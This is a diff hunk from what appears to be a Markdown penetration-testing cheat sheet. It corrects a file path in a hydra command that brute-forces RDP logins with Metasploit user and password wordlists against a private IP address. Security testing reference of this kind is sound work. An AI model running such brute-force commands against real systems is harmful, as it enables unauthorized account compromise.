@@ -38,7 +38,7 @@ Potentially allow attackers to remotely execute arbitrary code. Takes advantage 
 ## #hydra
 Brute force logins with dictionary
 ```bash
-hydra -L /us/share/metasploit-framework/data/wordlists/common_users.txt \
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
 -P /usr/share/metasploit-framework/unix_passwords.txt \
 rdp://10.2.24.85 -s 3333
 ```
